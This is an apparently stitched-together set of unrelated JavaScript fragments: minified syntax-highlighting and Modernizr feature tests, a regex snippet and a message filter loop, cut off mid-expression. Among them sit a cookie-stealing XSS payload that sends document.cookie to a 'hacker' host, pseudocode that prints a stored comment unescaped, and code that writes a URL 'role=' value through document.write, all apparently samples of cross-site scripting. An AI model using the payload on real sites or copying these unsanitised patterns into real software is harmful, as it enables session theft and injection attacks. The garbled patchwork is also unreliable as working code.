document.defaultView.getComputedStyle?document.defaultView.getComputedStyle(c,r).getPropertyValue("white-space"):0)&&"pre"===e.substring(0,3),e=u;(p=(p=c.className.match(/\blinenums\b(?::(\d+))?/))?p[1]&&p[1].length?+p[1]:!0:!1)&&G(c,p,e);b={h:h,c:c,j:p,i:e};H(b)}}}m<j.length?setTimeout(i,250):a&&a()}for(var g=[document.getElementsByTagName("pre"),document.getElementsByTagName("code"),document.getElementsByTagName("xmp")],j=[],n=0;n<g.length;++n)for(var l=0,w=g[n].length;l<w;++l)j.push(g[n][l]);var g=

var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;


// Regular expression for use later in the plugin.
'regexp': new RegExp(
              '[\\n\\r\\s]+'            // whitespace/newlines
            + '('                       // capture...
            + '[^\\n\\r\\s(?:&#160;)]+' // non-whitespace/newlines
            + '[\\n\\r\\s]*'            // trailing whitespace
            + ')$'                      // ...to end of the string

              , 'm' // match across newlines
          )

return A.appendChild(e),e.clientWidth>10})}),testStyles("#modernizr { height: 50vh; }",function(A){var e=parseInt(window.innerHeight/2,10),t=parseInt((window.getComputedStyle?getComputedStyle(A,null):A.currentStyle).height,10);Modernizr.addTest("cssvhunit",t==e)}),testStyles("#modernizr { width: 50vw; }",function(A){var e=parseInt(window.innerWidth/2,10),t=parseInt((window.getComputedStyle?getComputedStyle(A,null):A.currentStyle).width,10);Modernizr.addTest("cssvwunit",t==e)}),Modernizr.addTest("details",function(){var A,e=createElement("details");return"open"in e?(testStyles("#modernizr details{display:block}",function(t){t.appendChild(e),e.innerHTML="<summary>a</summary>b",A=e.offsetHeight,e.open=!0,A=A!=e.offsetHeight}),A):!1}),Modernizr.addTest("oninput",function(){var A,e=createElement("input");if(e.setAttribute("oninput","return"),hasEvent("oninput",docElement)||"function"==typeof e.oninput)return!0;try{var t=document.createEvent("KeyboardEvent");A=!1;var n=function(e){A=!0,e.preventDefault(),e.stopPropagation()};t.initKeyEvent("keypress",!0,!0,window,!1,!1,!1,!1,0,"e".charCodeAt(0)),docEl

print "<html>"
print "Latest comment:"
print database.latestComment
print "</html>"

  let startPosition = document.URL.indexOf("role=") + 5;
    let userRole = document.URL.substring(startPosition,document.URL.length); 
    document.write(userRole);

for (var i = 0; i < data.length; i++) {
                    var message = caseless ? data[i].message.toLowerCase() : data[i].message;

                    if ((!data[i].label || $.inArray(data[i].label, exclude) === -1) && (!search || message.indexOf(search) > -1)) {
                        fdata.push(data[i]);
                    }
                }

